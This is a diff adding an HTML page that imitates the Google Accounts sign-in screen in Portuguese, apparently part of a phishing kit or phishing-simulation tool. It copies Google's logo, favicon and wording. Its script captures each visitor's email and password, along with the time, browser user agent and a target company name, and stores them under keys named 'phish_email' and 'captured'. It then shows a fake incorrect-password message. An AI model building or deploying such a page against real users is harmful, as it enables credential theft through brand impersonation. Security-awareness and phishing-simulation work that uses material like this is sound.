@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Fazer login - Google Accounts</title>
+<link rel="stylesheet" href="style.css">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<link rel="icon" href="https://www.google.com/favicon.ico">
+</head>
+<body class="google-login">
+
+  <div class="card" id="step1">
+    <div class="glogo">
+      <svg width="74" height="24" viewBox="0 0 272 92"><path fill="#EA4335" d="M115 35.5v29.2h-8V22.9h9.9l19.9 30.3V22.9h8v41.8h-9.7z"/><path fill="#4285F4" d="M187.7 24.8v9.3h8.7v7h-8.7v17.7c0 4 2.3 5.9 6 5.9 1.2 0 2.4-.1 3.4-.4l1.4 6.9c-2 .7-4.4 1-6.9 1-8.1 0-11.6-4.7-11.6-12.6V41.1h-5.8v-7h5.8v-9.3z"/><path fill="#EA4335" d="M216.9 22.9c2.6 0 4.7 2.1 4.7 4.7s-2.1 4.8-4.7 4.8c-2.7 0-4.8-2.1-4.8-4.8s2.1-4.7 4.8-4.7zM213 41.1h7.9v23.7H213z"/><path fill="#34A853" d="M232.6 22.9h7.9v41.9h-7.9z"/><path fill="#4285F4" d="M253 41.1h7.9v23.7H253z"/><path fill="#EA4335" d="M257 22.9c2.6 0 4.7 2.1 4.7 4.7s-2.1 4.8-4.7 4.8c-2.7 0-4.8-2.1-4.8-4.8s2.1-4.7 4.8-4.7z"/><path fill="#FBBC05" d="M107 78.5c-6 0-11.8-2.3-16.1-6.6l5.5-5.5c2.8 2.8 6.6 4.4 10.6 4.4 6.6 0 8.7-3.1 9.3-5.7.3-1.6.3-3.6-.9-5.4-1.9 1.3-4.9 2.7-8.9 2.7-7.6 0-13.9-5.7-13.9-13.1S98.9 36 106.5 36c2.9 0 5.5.8 7.6 2v-1.8h7.9v25.6c0 10.2-6.3 16.7-15 16.7zm-.4-21.9c3.7 0 6.7-2.6 6.7-5.9s-3-5.9-6.7-5.9-6.7 2.6-6.7 5.9 3 5.9 6.7 5.9z"/><path fill="#EA4335" d="M60.3 37.9v11.9c0 7.9-6.4 14.3-14.3 14.3S31.7 57.7 31.7 49.8s6.4-14.3 14.3-14.3c2.7 0 5.3.8 7.4 2.1v-4.7c0-2.4-2.7-4.3-5-4.3-1.9 0-3.5 1.1-4.3 2.7l-9.7-4.2c2.3-5.2 7.6-8.8 13.7-8.8 7.9 0 12.2 5.7 12.2 12.9zm-14.3 14.7c3.7 0 6.7-2.6 6.7-5.9s-3-5.9-6.7-5.9-6.7 2.6-6.7 5.9 3 5.9 6.7 5.9z"/></svg>
+    </div>
+    <h1>Fazer login</h1>
+    <p class="subtitle">usar sua Conta do Google</p>
+
+    <div class="field">
+      <input type="email" id="email" placeholder="E-mail ou telefone" autocomplete="username"
+             onkeydown="if(event.key==='Enter'){event.preventDefault();goStep2();}">
+    </div>
+    <a href="pages/esqueceu-email.html" class="blue-link">Esqueceu seu e-mail?</a>
+
+    <p class="hint">
+      Não está no seu computador? Use uma janela de navegação privada para fazer login.
+      <a href="pages/saiba-mais.html" class="blue-link">Saiba mais</a>
+    </p>
+
+    <div class="card-footer">
+      <a href="pages/criar-conta.html" class="blue-link">Criar conta</a>
+      <button class="btn-blue" onclick="goStep2()">Próxima</button>
+    </div>
+  </div>
+
+  <div class="card hidden" id="step2">
+    <div class="glogo">
+      <svg width="40" height="40" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9 3.5l6.7-6.7C35.6 2.4 30.2 0 24 0 14.6 0 6.5 5.4 2.6 13.2l7.8 6.1C12.3 13.4 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.7c-.6 3.2-2.4 5.9-5.2 7.8l7.5 5.8c4.4-4.1 7.5-10.2 7.5-18.1z"/><path fill="#FBBC05" d="M10.4 28.2c-.5-1.5-.8-3.1-.8-4.7s.3-3.2.8-4.7l-7.8-6.1C1 16.1 0 20 0 23.5s1 7.4 2.6 10.8z"/><path fill="#34A853" d="M24 47c6.2 0 11.6-2 15.5-5.6l-7.5-5.8c-2.1 1.4-4.8 2.3-8 2.3-6.3 0-11.7-3.9-13.6-9.4l-7.8 6.1C6.5 42.1 14.6 47 24 47z"/></svg>
+    </div>
+    <h1 id="greeting">Olá</h1>
+    <p class="subtitle" id="emailDisplay"></p>
+
+    <div class="field">
+      <input type="password" id="password" placeholder="Digite sua senha" autocomplete="current-password"
+             onkeydown="if(event.key==='Enter'){event.preventDefault();doLogin();}">
+    </div>
+    <label class="checkbox"><input type="checkbox" checked> Não sou um robô</label>
+    <a href="pages/esqueceu-senha.html" class="blue-link">Esqueceu a senha?</a>
+
+    <div class="card-footer">
+      <a href="pages/outra-forma.html" class="blue-link">Tentar outra forma de acesso</a>
+      <button class="btn-blue" type="submit" form="loginForm">Fazer login</button>
+    </div>
+    <form id="loginForm"></form>
+  </div>
+
+  <div id="errorBox" class="hidden">
+    ⚠ A senha inserida está incorreta. <a href="pages/esqueceu-senha.html">Esqueceu a senha?</a>
+  </div>
+
+  <footer class="page-footer">
+    <span id="empresaFooter">Portais Corporativos</span>
+    <div>
+      <a href="pages/saiba-mais.html">Ajuda</a>
+      <a href="pages/saiba-mais.html">Privacidade</a>
+      <a href="pages/saiba-mais.html">Termos</a>
+    </div>
+  </footer>
+
+<script>
+const NOME_EMPRESA = "Empresa LTDA";
+document.getElementById('empresaFooter').textContent = NOME_EMPRESA + " · Portais Corporativos";
+
+function goStep2(){
+  const email = document.getElementById('email').value.trim();
+  if(!email.includes('@')){ document.getElementById('email').focus(); return; }
+  sessionStorage.setItem('phish_email', email);
+  document.getElementById('emailDisplay').textContent = email;
+  document.getElementById('greeting').textContent = "Olá, " + email.split('@')[0].split('.')[0];
+  document.getElementById('step1').classList.add('hidden');
+  document.getElementById('step2').classList.remove('hidden');
+  document.getElementById('password').focus();
+}
+
+function doLogin(){
+  const senha = document.getElementById('password').value;
+  if(!senha){ document.getElementById('password').focus(); return; }
+
+  const cred = {
+    email: sessionStorage.getItem('phish_email') || '(vazio)',
+    password: senha,
+    timestamp: new Date().toLocaleTimeString('pt-BR'),
+    userAgent: navigator.userAgent,
+    target: NOME_EMPRESA
+  };
+  const store = JSON.parse(localStorage.getItem('captured') || '[]');
+  store.push(cred);
+  localStorage.setItem('captured', JSON.stringify(store));
+  localStorage.setItem('captured_event', Date.now());
+
+  document.getElementById('step2').classList.add('hidden');
+  document.getElementById('errorBox').classList.remove('hidden');
+}
+
+document.getElementById('loginForm').addEventListener('submit', function(e){
+  e.preventDefault();
+  doLogin();
+});
+function retry(e){
+  e.preventDefault();
+  document.getElementById('errorBox').classList.add('hidden');
+  document.getElementById('step2').classList.remove('hidden');
+  document.getElementById('password').value = '';
+  document.getElementById('password').focus();
+}
+</script>
+</body>
+</html>
